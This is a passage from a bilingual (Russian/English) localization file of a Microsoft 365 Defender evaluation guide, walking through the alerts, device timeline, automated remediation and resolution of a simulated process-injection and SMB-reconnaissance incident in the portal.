   <span data-ttu-id="34198-216">Оповещения, которые показаны на панели мониторинга, могут фильтроваться на основе ресурсов служб: Microsoft Defender for Identity, Microsoft Cloud App Security, Microsoft Defender для конечной точки, Microsoft 365 Defender и Microsoft Defender для Office 365.</span><span class="sxs-lookup"><span data-stu-id="34198-216">The alerts that are shown in the dashboard can be filtered based on service resources: Microsoft Defender for Identity, Microsoft Cloud App Security, Microsoft Defender for Endpoint, Microsoft 365 Defender, and Microsoft Defender for Office 365.</span></span>

3. <span data-ttu-id="34198-217">Выберите **страницу Открытый** инцидент, чтобы получить дополнительные сведения об инциденте.</span><span class="sxs-lookup"><span data-stu-id="34198-217">Select **Open incident page** to get more information about the incident.</span></span>

   <span data-ttu-id="34198-218">На странице **Incident** можно увидеть все оповещения и сведения, связанные с инцидентом.</span><span class="sxs-lookup"><span data-stu-id="34198-218">In the **Incident** page, you can see all the alerts and information related to the incident.</span></span> <span data-ttu-id="34198-219">Эти сведения включают объекты и активы, участвующие в оповещении, источник обнаружения оповещений (например, Microsoft Defender для удостоверений или Microsoft Defender для конечной точки), а также причину их взаимосвязи.</span><span class="sxs-lookup"><span data-stu-id="34198-219">The information includes the entities and assets that are involved in the alert, the detection source of the alerts (such as Microsoft Defender for Identity or Microsoft Defender for Endpoint), and the reason they were linked together.</span></span> <span data-ttu-id="34198-220">Просмотр списка оповещений об инциденте показывает прогрессирование атаки.</span><span class="sxs-lookup"><span data-stu-id="34198-220">Reviewing the incident alert list shows the progression of the attack.</span></span> <span data-ttu-id="34198-221">Из этого представления можно просмотреть и изучить отдельные оповещения.</span><span class="sxs-lookup"><span data-stu-id="34198-221">From this view, you can see and investigate the individual alerts.</span></span>

   <span data-ttu-id="34198-222">Вы также можете нажать **кнопку Управление** инцидентом из правой стороны меню, чтобы отметить инцидент, назначить его себе и добавить комментарии.</span><span class="sxs-lookup"><span data-stu-id="34198-222">You can also click **Manage incident** from the right-hand menu, to tag the incident, assign it to yourself, and add comments.</span></span>

#### <a name="review-generated-alerts"></a><span data-ttu-id="34198-223">Просмотр созданных оповещений</span><span class="sxs-lookup"><span data-stu-id="34198-223">Review generated alerts</span></span>

<span data-ttu-id="34198-224">Рассмотрим некоторые оповещения, созданные во время имитации атаки.</span><span class="sxs-lookup"><span data-stu-id="34198-224">Let's look at some of the alerts generated during the simulated attack.</span></span>

> [!NOTE]
> <span data-ttu-id="34198-225">Мы проявим только несколько оповещений, созданных во время имитации атаки.</span><span class="sxs-lookup"><span data-stu-id="34198-225">We'll walk through only a few of the alerts generated during the simulated attack.</span></span> <span data-ttu-id="34198-226">В зависимости от версии Windows и Microsoft 365 Defender, запущенных на тестовом устройстве, вы можете видеть больше оповещений, которые отображаются в несколько ином порядке.</span><span class="sxs-lookup"><span data-stu-id="34198-226">Depending on the version of Windows and the Microsoft 365 Defender products running on your test device, you might see more alerts that appear in a slightly different order.</span></span>

![Пример созданных оповещений](../../media/mtp/fig6.png)

##### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint"></a><span data-ttu-id="34198-228">Предупреждение. Наблюдается подозрительный процесс впрыскивания (Источник: Microsoft Defender для конечной точки)</span><span class="sxs-lookup"><span data-stu-id="34198-228">Alert: Suspicious process injection observed (Source: Microsoft Defender for Endpoint)</span></span>

<span data-ttu-id="34198-229">Расширенные злоумышленники используют сложные и скрытные методы для сохраняющихся в памяти и скрыться от средств обнаружения.</span><span class="sxs-lookup"><span data-stu-id="34198-229">Advanced attackers use sophisticated and stealthy methods to persist in memory and hide from detection tools.</span></span> <span data-ttu-id="34198-230">Одним из распространенных методов является работа в рамках доверенного системного процесса, а не из вредоносного исполняемого, что делает его трудно для средств обнаружения и операций безопасности, чтобы обнаружить вредоносный код.</span><span class="sxs-lookup"><span data-stu-id="34198-230">One common technique is to operate from within a trusted system process rather than a malicious executable, making it hard for detection tools and security operations to spot the malicious code.</span></span>

<span data-ttu-id="34198-231">Чтобы позволить аналитикам SOC ловить эти расширенные атаки, датчики глубокой памяти в Microsoft Defender для Конечной точки предоставляют нашей облачной службе беспрецедентную видимость в различных методах впрыскивания кода.</span><span class="sxs-lookup"><span data-stu-id="34198-231">To allow the SOC analysts to catch these advanced attacks, deep memory sensors in Microsoft Defender for Endpoint provide our cloud service with unprecedented visibility into a variety of cross-process code injection techniques.</span></span> <span data-ttu-id="34198-232">На следующем рисунке показано, как Defender для конечной точки обнаруживали и оповещали о попытке ввести код <i>вnotepad.exe. </i></span><span class="sxs-lookup"><span data-stu-id="34198-232">The following figure shows how Defender for Endpoint detected and alerted on the attempt to inject code to <i>notepad.exe</i>.</span></span>

![Пример оповещения о впрыске потенциально вредоносного кода](../../media/mtp/fig7.png)

##### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint"></a><span data-ttu-id="34198-234">Предупреждение. Непредвиденное поведение, наблюдаемое процессом без аргументов командной строки (Источник: Microsoft Defender для конечной точки)</span><span class="sxs-lookup"><span data-stu-id="34198-234">Alert: Unexpected behavior observed by a process run with no command-line arguments (Source: Microsoft Defender for Endpoint)</span></span>

<span data-ttu-id="34198-235">Обнаружение microsoft Defender для конечных точек часто нацелено на наиболее распространенный атрибут метода атаки.</span><span class="sxs-lookup"><span data-stu-id="34198-235">Microsoft Defender for Endpoint detections often target the most common attribute of an attack technique.</span></span> <span data-ttu-id="34198-236">Этот метод обеспечивает долговечность и повышает планку перехода злоумышленников на более новую тактику.</span><span class="sxs-lookup"><span data-stu-id="34198-236">This method ensures durability and raises the bar for attackers to switch to newer tactics.</span></span>

<span data-ttu-id="34198-237">Мы используем крупномасштабные алгоритмы обучения для установления нормального поведения общих процессов в организации и во всем мире и следим за тем, когда эти процессы показывают аномальное поведение.</span><span class="sxs-lookup"><span data-stu-id="34198-237">We employ large-scale learning algorithms to establish the normal behavior of common processes within an organization and worldwide and watch for when these processes show anomalous behaviors.</span></span> <span data-ttu-id="34198-238">Эти аномальные действия часто указывают на то, что внедрили и запускали в другом доверяемом процессе.</span><span class="sxs-lookup"><span data-stu-id="34198-238">These anomalous behaviors often indicate that extraneous code was introduced and is running in an otherwise trusted process.</span></span>

<span data-ttu-id="34198-239">В этом сценарии <i> процесс </i>notepad.exeаномальное поведение, связанное с связью с внешним расположением.</span><span class="sxs-lookup"><span data-stu-id="34198-239">For this scenario, the process <i>notepad.exe</i> is exhibiting abnormal behavior, involving communication with an external location.</span></span> <span data-ttu-id="34198-240">Этот результат не зависит от конкретного метода, используемого для внедрения и выполнения вредоносного кода.</span><span class="sxs-lookup"><span data-stu-id="34198-240">This outcome is independent of the specific method used to introduce and execute the malicious code.</span></span>

> [!NOTE]
> <span data-ttu-id="34198-241">Поскольку это предупреждение основано на моделях машинного обучения, которые требуют дополнительной обработки backend, может потребоваться некоторое время, прежде чем вы увидите это оповещение на портале.</span><span class="sxs-lookup"><span data-stu-id="34198-241">Because this alert is based on machine-learning models that require additional backend processing, it might take some time before you see this alert in the portal.</span></span>

<span data-ttu-id="34198-242">Обратите внимание, что сведения об оповещении включают внешний IP-адрес — индикатор, который можно использовать в качестве поворота для расширения расследования.</span><span class="sxs-lookup"><span data-stu-id="34198-242">Notice that the alert details include the external IP address—an indicator that you can use as a pivot to expand investigation.</span></span>

<span data-ttu-id="34198-243">Выберите IP-адрес в дереве процесса оповещения, чтобы просмотреть страницу сведений о IP-адресе.</span><span class="sxs-lookup"><span data-stu-id="34198-243">Select the IP address in the alert process tree to view the IP address details page.</span></span>

![Пример оповещения о неожиданном поведении процесса, запускаемого без аргументов командной строки](../../media/mtp/fig8.png)

<span data-ttu-id="34198-245">На следующем рисунке отображается выбранная страница сведений об IP-адресе (щелкнув IP-адрес в дереве процесса Оповещения).</span><span class="sxs-lookup"><span data-stu-id="34198-245">The following figure displays the selected IP Address details page (clicking on IP address in the Alert process tree).</span></span>

![Пример страницы сведений об IP-адресе](../../media/mtp/fig9.png)

##### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a><span data-ttu-id="34198-247">Оповещение. Разведка пользовательских и IP-адресов (SMB) (Источник: Microsoft Defender for Identity)</span><span class="sxs-lookup"><span data-stu-id="34198-247">Alert: User and IP address reconnaissance (SMB) (Source: Microsoft Defender for Identity)</span></span>

<span data-ttu-id="34198-248">Составление переучета с помощью протокола Блокировка серверных сообщений (SMB) позволяет злоумышленникам получать последние сведения о логосе пользователя, которые помогают им перемещаться по сети, чтобы получить доступ к определенной конфиденциальной учетной записи.</span><span class="sxs-lookup"><span data-stu-id="34198-248">Enumeration using Server Message Block (SMB) protocol enables attackers to get recent user logon information that helps them move laterally through the network to access a specific sensitive account.</span></span>

<span data-ttu-id="34198-249">В этом обнаружении срабатывает оповещение при запуске переумерия сеанса SMB с контроллером домена.</span><span class="sxs-lookup"><span data-stu-id="34198-249">In this detection, an alert is triggered when the SMB session enumeration runs against a domain controller.</span></span>

![Пример оповещений Microsoft Defender for Identity для разведки пользователей и IP-адресов](../../media/mtp/fig10.png)

#### <a name="review-the-device-timeline-with-microsoft-defender-for-endpoint"></a><span data-ttu-id="34198-251">Просмотрите хронологию устройства с помощью Microsoft Defender для конечной точки</span><span class="sxs-lookup"><span data-stu-id="34198-251">Review the device timeline with Microsoft Defender for Endpoint</span></span>

<span data-ttu-id="34198-252">После изучения различных оповещений в этом инциденте перейдите на страницу инцидента, которая была исследована ранее.</span><span class="sxs-lookup"><span data-stu-id="34198-252">After exploring the various alerts in this incident, navigate back to the incident page you investigated earlier.</span></span> <span data-ttu-id="34198-253">Выберите **вкладку Devices** на странице инцидента, чтобы просмотреть устройства, участвующие в этом инциденте, о чем сообщили Microsoft Defender для конечной точки и Microsoft Defender for Identity.</span><span class="sxs-lookup"><span data-stu-id="34198-253">Select the **Devices** tab in the incident page to review the devices involved in this incident as reported by Microsoft Defender for Endpoint and Microsoft Defender for Identity.</span></span>

<span data-ttu-id="34198-254">Выберите имя устройства, на котором была совершена атака, чтобы открыть страницу сущности для этого конкретного устройства.</span><span class="sxs-lookup"><span data-stu-id="34198-254">Select the name of the device where the attack was conducted, to open the entity page for that specific device.</span></span> <span data-ttu-id="34198-255">На этой странице можно увидеть оповещения, которые были вызваны и связанные события.</span><span class="sxs-lookup"><span data-stu-id="34198-255">In that page, you can see alerts that were triggered and related events.</span></span>

<span data-ttu-id="34198-256">Выберите **вкладку Timeline** для открытия временной шкалы устройства и просмотра всех событий и поведения, наблюдаемых на устройстве в хронологическом порядке, впереме с поднятыми оповещениями.</span><span class="sxs-lookup"><span data-stu-id="34198-256">Select the **Timeline** tab to open the device timeline and view all events and behaviors observed on the device in chronological order, interspersed with the alerts raised.</span></span>

![Пример временной шкалы устройства с поведением](../../media/mtp/fig11.png)

<span data-ttu-id="34198-258">Расширение некоторых наиболее интересных поведений содержит полезные сведения, например, деревья процессов.</span><span class="sxs-lookup"><span data-stu-id="34198-258">Expanding some of the more interesting behaviors provides useful details, such as process trees.</span></span>

<span data-ttu-id="34198-259">Например, прокрутите вниз, пока не найдете наблюдаемую инъекцию подозрительного процесса **оповещения.**</span><span class="sxs-lookup"><span data-stu-id="34198-259">For example, scroll down until you find the alert event **Suspicious process injection observed**.</span></span> <span data-ttu-id="34198-260">Выберите **powershell.exe,** впрыскивающееся в notepad.exe процесса ниже него, чтобы отобразить полное дерево процесса для этого поведения в графе сущностями событий на боковой области. </span><span class="sxs-lookup"><span data-stu-id="34198-260">Select the **powershell.exe injected to notepad.exe process** event below it, to display the full process tree for this behavior under the **Event entities** graph on the side pane.</span></span> <span data-ttu-id="34198-261">При необходимости используйте панели поиска для фильтрации.</span><span class="sxs-lookup"><span data-stu-id="34198-261">Use the search bar for filtering if necessary.</span></span>

![Пример дерева процесса для выбранного поведения создания файлов PowerShell](../../media/mtp/fig12.png)

#### <a name="review-the-user-information-with-microsoft-cloud-app-security"></a><span data-ttu-id="34198-263">Просмотрите сведения о пользователе с помощью Microsoft Cloud App Security</span><span class="sxs-lookup"><span data-stu-id="34198-263">Review the user information with Microsoft Cloud App Security</span></span>

<span data-ttu-id="34198-264">На странице инцидента выберите вкладку **"Пользователи",** чтобы отобразить список пользователей, участвующих в атаке.</span><span class="sxs-lookup"><span data-stu-id="34198-264">On the incident page, select the **Users** tab to display the list of users involved in the attack.</span></span> <span data-ttu-id="34198-265">В таблице содержатся дополнительные сведения о каждом пользователе, включая оценку приоритета расследования **каждого** пользователя.</span><span class="sxs-lookup"><span data-stu-id="34198-265">The table contains additional information about each user, including each user's **Investigation Priority** score.</span></span>

<span data-ttu-id="34198-266">Выберите имя пользователя, чтобы открыть страницу профиля пользователя, на которой может быть проведено дополнительное исследование.</span><span class="sxs-lookup"><span data-stu-id="34198-266">Select the user name to open the user's profile page where further investigation can be conducted.</span></span> <span data-ttu-id="34198-267">[Узнайте больше о расследовании рискованных пользователей.](/cloud-app-security/tutorial-ueba#identify)</span><span class="sxs-lookup"><span data-stu-id="34198-267">[Read more about investigating risky users](/cloud-app-security/tutorial-ueba#identify).</span></span>

![Пример страницы Cloud App Security пользователя](../../media/mtp/fig13.png)

#### <a name="automated-investigation-and-remediation"></a><span data-ttu-id="34198-269">Автоматическое исследование и защита</span><span class="sxs-lookup"><span data-stu-id="34198-269">Automated investigation and remediation</span></span>

> [!NOTE]
><span data-ttu-id="34198-270">Прежде чем мы пройдемся по этому моделированию, просмотрите следующее видео, чтобы узнать, что такое автоматическое самовосстановления, где найти его на портале и как оно может помочь в операциях по обеспечению безопасности:</span><span class="sxs-lookup"><span data-stu-id="34198-270">Before we walk you through this simulation, watch the following video to get familiar with what automated self-healing is, where to find it in the portal, and how it can help in your security operations:</span></span>

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

<span data-ttu-id="34198-271">Перейдите к инциденту на Microsoft 365 Defender портале.</span><span class="sxs-lookup"><span data-stu-id="34198-271">Navigate back to the incident in the Microsoft 365 Defender portal.</span></span> <span data-ttu-id="34198-272">На **вкладке "Исследования"** на странице **Incident** показаны автоматические расследования, которые были инициированы Microsoft Defender для удостоверений и Microsoft Defender для конечной точки.</span><span class="sxs-lookup"><span data-stu-id="34198-272">The **Investigations** tab in the **Incident** page shows the automated investigations that were triggered by Microsoft Defender for Identity and Microsoft Defender for Endpoint.</span></span> <span data-ttu-id="34198-273">На приведенном ниже снимке экрана отображается только автоматическое расследование, инициированное Defender для конечной точки.</span><span class="sxs-lookup"><span data-stu-id="34198-273">The screenshot below displays only the automated investigation triggered by Defender for Endpoint.</span></span> <span data-ttu-id="34198-274">По умолчанию Defender для конечной точки автоматически устраняет артефакты, найденные в очереди, что требует исправлений.</span><span class="sxs-lookup"><span data-stu-id="34198-274">By default, Defender for Endpoint automatically remediates the artifacts found in the queue, which requires remediation.</span></span>

![Пример автоматизированных расследований, связанных с инцидентом](../../media/mtp/fig14.png)

<span data-ttu-id="34198-276">Выберите оповещение, которое вызвало расследование, чтобы открыть страницу **сведений о расследовании.**</span><span class="sxs-lookup"><span data-stu-id="34198-276">Select the alert that triggered an investigation to open the **Investigation details** page.</span></span> <span data-ttu-id="34198-277">Вы увидите следующие сведения:</span><span class="sxs-lookup"><span data-stu-id="34198-277">You'll see the following details:</span></span>

- <span data-ttu-id="34198-278">Оповещение(ы), которое вызвало автоматическое расследование.</span><span class="sxs-lookup"><span data-stu-id="34198-278">Alert(s) that triggered the automated investigation.</span></span>
- <span data-ttu-id="34198-279">Влияние пользователей и устройств.</span><span class="sxs-lookup"><span data-stu-id="34198-279">Impacted users and devices.</span></span> <span data-ttu-id="34198-280">Если индикаторы находятся на дополнительных устройствах, эти дополнительные устройства также будут перечислены.</span><span class="sxs-lookup"><span data-stu-id="34198-280">If indicators are found on additional devices, these additional devices will be listed as well.</span></span>
- <span data-ttu-id="34198-281">Список доказательств.</span><span class="sxs-lookup"><span data-stu-id="34198-281">List of evidence.</span></span> <span data-ttu-id="34198-282">Объекты, найденные и проанализированы, например файлы, процессы, службы, драйверы и сетевые адреса.</span><span class="sxs-lookup"><span data-stu-id="34198-282">The entities found and analyzed, such as files, processes, services, drivers, and network addresses.</span></span> <span data-ttu-id="34198-283">Эти сущности анализируются для возможных связей с оповещением и оцениваются как доброкачественные или вредоносные.</span><span class="sxs-lookup"><span data-stu-id="34198-283">These entities are analyzed for possible relationships to the alert and rated as benign or malicious.</span></span>
- <span data-ttu-id="34198-284">Найдены угрозы.</span><span class="sxs-lookup"><span data-stu-id="34198-284">Threats found.</span></span> <span data-ttu-id="34198-285">Известные угрозы, найденные в ходе расследования.</span><span class="sxs-lookup"><span data-stu-id="34198-285">Known threats that are found during the investigation.</span></span>

> [!NOTE]
> <span data-ttu-id="34198-286">В зависимости от времени может быть запущено автоматическое расследование.</span><span class="sxs-lookup"><span data-stu-id="34198-286">Depending on timing, the automated investigation might still be running.</span></span> <span data-ttu-id="34198-287">Подождите несколько минут, пока процесс не завершится, прежде чем собирать и анализировать доказательства и анализировать результаты.</span><span class="sxs-lookup"><span data-stu-id="34198-287">Wait a few minutes for the process to complete before you collect and analyze the evidence and review the results.</span></span> <span data-ttu-id="34198-288">Обновите **страницу сведения о** расследовании, чтобы получить последние результаты.</span><span class="sxs-lookup"><span data-stu-id="34198-288">Refresh the **Investigation details** page to get the latest findings.</span></span>

![Пример страницы Сведения о расследовании](../../media/mtp/fig15.png)

<span data-ttu-id="34198-290">В ходе автоматического исследования Microsoft Defender for Endpoint определил процесс notepad.exe, который был введен в качестве одного из артефактов, требующих восстановления.</span><span class="sxs-lookup"><span data-stu-id="34198-290">During the automated investigation, Microsoft Defender for Endpoint identified the notepad.exe process, which was injected as one of the artifacts requiring remediation.</span></span> <span data-ttu-id="34198-291">Defender for Endpoint автоматически останавливает подозрительную инъекцию процесса в рамках автоматического восстановления.</span><span class="sxs-lookup"><span data-stu-id="34198-291">Defender for Endpoint automatically stops the suspicious process injection as part of the automated remediation.</span></span>

<span data-ttu-id="34198-292">Вы можете <i>notepad.exe</i> из списка запущенных процессов на тестовом устройстве.</span><span class="sxs-lookup"><span data-stu-id="34198-292">You can see <i>notepad.exe</i> disappear from the list of running processes on the test device.</span></span>

#### <a name="resolve-the-incident"></a><span data-ttu-id="34198-293">Устранение инцидента</span><span class="sxs-lookup"><span data-stu-id="34198-293">Resolve the incident</span></span>

<span data-ttu-id="34198-294">После завершения расследования и подтверждения его устранения вы уладили инцидент.</span><span class="sxs-lookup"><span data-stu-id="34198-294">After the investigation is complete and confirmed to be remediated, you resolve the incident.</span></span>

<span data-ttu-id="34198-295">На странице **Инцидент** выберите Управление **инцидентом**.</span><span class="sxs-lookup"><span data-stu-id="34198-295">From the **Incident** page, select **Manage incident**.</span></span> <span data-ttu-id="34198-296">Установите состояние для **устранения инцидента** и выберите **true alert** для классификации и **тестирования** безопасности для определения.</span><span class="sxs-lookup"><span data-stu-id="34198-296">Set the status to **Resolve incident** and select **True alert** for the classification and **Security testing** for the determination.</span></span>

![Пример страницы инцидентов с открытой панелью Управление инцидентами, на которой можно щелкнуть переключатель для устранения инцидента](../../media/mtp/fig16.png)

<span data-ttu-id="34198-298">После устранения инцидента он устраняет все связанные оповещения на Microsoft 365 Defender портале и соответствующих порталах.</span><span class="sxs-lookup"><span data-stu-id="34198-298">When the incident is resolved, it resolves all of the associated alerts in Microsoft 365 Defender portal and in the related portals.</span></span>

<span data-ttu-id="34198-299">Это завершает моделирование атаки для анализа инцидентов, автоматического расследования и разрешения инцидентов.</span><span class="sxs-lookup"><span data-stu-id="34198-299">This wraps up the attack simulation for incident analysis, automated investigation, and incident resolution.</span></span>

## <a name="next-step"></a><span data-ttu-id="34198-300">Следующее действие</span><span class="sxs-lookup"><span data-stu-id="34198-300">Next step</span></span>

<span data-ttu-id="34198-301">[![Попробуйте Microsoft 365 Defender возможности реагирования на инциденты](../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png)](eval-defender-investigate-respond-additional.md)</span><span class="sxs-lookup"><span data-stu-id="34198-301">[![Try Microsoft 365 Defender incident response capabilities](../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png)](eval-defender-investigate-respond-additional.md)</span></span>

<span data-ttu-id="34198-302">Шаг 2 из 2. [Попробуйте Microsoft 365 Defender реагирования на инциденты](eval-defender-investigate-respond-additional.md)</span><span class="sxs-lookup"><span data-stu-id="34198-302">Step 2 of 2: [Try Microsoft 365 Defender incident response capabilities](eval-defender-investigate-respond-additional.md)</span></span>

### <a name="navigation-you-may-need"></a><span data-ttu-id="34198-303">Навигация может потребоваться</span><span class="sxs-lookup"><span data-stu-id="34198-303">Navigation you may need</span></span>

[<span data-ttu-id="34198-304">Создание среды Microsoft 365 Defender оценки</span><span class="sxs-lookup"><span data-stu-id="34198-304">Create the Microsoft 365 Defender Evaluation Environment</span></span>](eval-create-eval-environment.md)
